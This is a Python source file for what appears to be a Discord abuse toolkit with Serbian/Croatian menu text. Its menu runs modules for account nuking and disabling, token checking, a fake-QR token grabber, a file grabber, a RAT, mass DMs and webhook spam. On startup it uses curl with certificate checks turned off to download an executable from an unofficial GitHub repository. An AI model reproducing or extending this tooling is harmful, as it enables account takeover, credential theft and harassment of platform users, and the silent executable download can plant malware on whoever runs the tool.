from util.plugins.update import search_for_updates
from util.plugins.commun import *

def main():
    clear()
    setTitle(f"{THIS_VERSION}")
    astraahometitle()
    print(f"""{y}[{w}01{y}]{b} Account Nuker           {y}[{w}07{y}]{b} Tokens Checker   {y}[{w}13{y}]{b} QrCode                  
{y}[{w}02{y}]{b} Account Disabler        {y}[{w}08{y}]{b} Clear DM         {y}[{w}14{y}]{b} Webhook Spammer
{y}[{w}03{y}]{b} Account Generator       {y}[{w}09{y}]{b} House Changer    {y}[{w}15{y}]{b} Webhook Remover
{y}[{w}04{y}]{b} Settings Cycler         {y}[{w}10{y}]{b} Server Lookup
{y}[{w}05{y}]{b} Token Informations      {y}[{w}11{y}]{b} Mass DM
{y}[{w}06{y}]{b} AutoLogin               {y}[{w}12{y}]{b} Group Spammer          
""")

    global choice   
    choice = input(f"""{y}[{w}--->{y}]{b} IZABERI KOMANDU: """)
    
    if choice == '77' or choice == '77':
        transition()
        selfbottitle()
        input(f"{y}[{Fore.LIGHTRED_EX }!{y}]{w} NIJE JOS NAPRAVLJENO.")
        main()       
    elif choice == '99' or choice == '99':
        transition()
        exec(open('util/2_Rat/rat.py').read())
    elif choice == '55' or choice == '55':
        transition()
        raidtitle()
        input(f"{y}[{Fore.LIGHTRED_EX }!{y}]{w} NIJE JOS NAPRAVLJENO.")
        main()
    elif choice == '66' or choice == '66':
        transition()
        raidtitle()
        input(f"{y}[{Fore.LIGHTRED_EX }!{y}]{w} NIJE JOS NAPRAVLJENO.")
        main()
    elif choice == '88' or choice == '88':
        transition()
        subprocess.call([r'util\\5_VidCrashMaker\\crashvideomaker.bat'])
    elif choice == '33' or choice == '33':
        transition()
        exec(open('util/6_FileGrab/filegrabber.py').read())
    elif choice == '100' or choice == '100':
        transition()
        imagegrabbertitle()
        input(f"{y}[{Fore.LIGHTRED_EX }!{y}]{w} NIJE JOS NAPRAVLJENO.")
        main()
    elif choice == '13' or choice == '13':
        transition()
        exec(open('util/8_TokenFakeQr/fakeqr.py').read())
    elif choice == '1'or choice == '01':
        transition()
        exec(open('util/9_AccountNuker/accountnuker.py').read())
    elif choice == '2'or choice == '02':
        transition()
        exec(open('util/10_AccountDisabler/accountdisabler.py').read())
    elif choice == '3':
        transition()
        accountgentitle()
        input(f"{y}[{Fore.LIGHTRED_EX }!{y}]{w} NIJE JOS NAPRAVLJENO.")
        main()
    elif choice == '4'or choice == '04':
        transition()
        exec(open('util/12_SettingsCycler/settingscycler.py').read())
    elif choice == '5'or choice == '05':
        transition()
        exec(open('util/13_TokenInfo/tokeninfo.py').read())
    elif choice == '6'or choice == '06':
        transition()
        exec(open('util/14_AutoLogin/autologin.py').read())
    elif choice == '7'or choice == '07':
        transition()
        exec(open('util/15_TokensChecker/tokenschecker.py').read()) 
    elif choice == '8'or choice == '08':
        transition()
        exec(open('util/16_ClearDM/cleardm.py').read())
    elif choice == '9'or choice == '09':
        transition()
        exec(open('util/17_HouseChanger/housechanger.py').read())
    elif choice == '10':
        transition()
        exec(open('util/18_ServerLookup/serverlookup.py').read())
    elif choice == '11':
        transition()
        exec(open('util/19_MassDM/massdm.py').read())
    elif choice == '12':
        transition()
        exec(open('util/20_GroupSpammer/groupspammer.py').read())
    elif choice == '14':
            transition()
            exec(open('util/22_WebHSpam/webhspam.py').read()) 
    elif choice == '15':
        transition()
        exec(open('util/23_WebHRemover/webhremover.py').read())      
    elif choice == '>':
        clear()
        astraahometitle()
        print(f"""      {y}[{b}+{y}]{w} Nitro Options:          {y}[{b}+{y}]{w} WebHooks Options:        {y}[{b}+{y}]{w} Other Options:
\n          {y}[{w}21{y}]{w} Generator              {y}[{w}22{y}]{w} Spammer                 {y}[{w}24{y}]{w} Credits
\n                                      {y}[{w}23{y}]{w} Remover                 {y}[{w}25{y}]{w} Exit\n\n\n\n\n\n\n\n\n\n                                                                                                     {y}[{b}<{y}]{w} Previous Page""")
        choice = input(f"""{y}[{b}#{y}]{w} IZABERI: """)
        if choice == '21':
            transition()
            exec(open('util/21_NitroGen/nitrogen.py').read())
        elif choice == '24':
            transition()
            astraahometitle()
            print(f"""                                            {y}[{b}+{y}]{w} DEVELOPMENT LeyoZz#001:\n\n""")
            input(f"""{y}[{b}#{y}]{w} PRITISNI ENTER ZA EXIT""")
            main()
        elif choice == '25':
            transition()
            sys.exit()
        elif choice == '<':
            clear()
            main()    
        else:
            clear()
            main()
    else:
        clear()
        main()


if __name__ == "__main__":
    import sys
    setTitle("UCITAVA SE...")
    
    System.Size(120, 30)
    Anime.Fade(Center.Center(banner), Colors.purple_to_blue, Colorate.Vertical, time=1)
    if not os.path.exists("output"):
        os.makedirs("output", exist_ok=True)
    if os.path.exists("output/QR-Code"):
        shutil.rmtree(f"output/QR-Code")
    os.system("""if not exist "util/chromedriver.exe" echo [#] Downloading chromedriver: """)
    os.system("""if not exist "util/chromedriver.exe" curl -#fkLo "util/chromedriver.exe" "https://github.com/BokiSenss/inspectcrome/raw/main/chromedriver.exe" """)
    if os.path.basename(sys.argv[0]).endswith("exe"):
        search_for_updates()
        if not os.path.exists(getTempDir()+"\\atio_proxies"):
            proxy_scrape()
        clear()
        main()
    try:
        assert sys.version_info >= (3,9)
    except AssertionError:
        input(f"{y}[{Fore.RED}#{y}]{w} Tvoja python verzija nije dobra ({sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]}) skini python 3.10 ili ako postoji vise od toga!")
        sys.exit()
    else:
        search_for_updates()
        if not os.path.exists(getTempDir()+"\\atio_proxies"):
            proxy_scrape()
        clear()
        main()
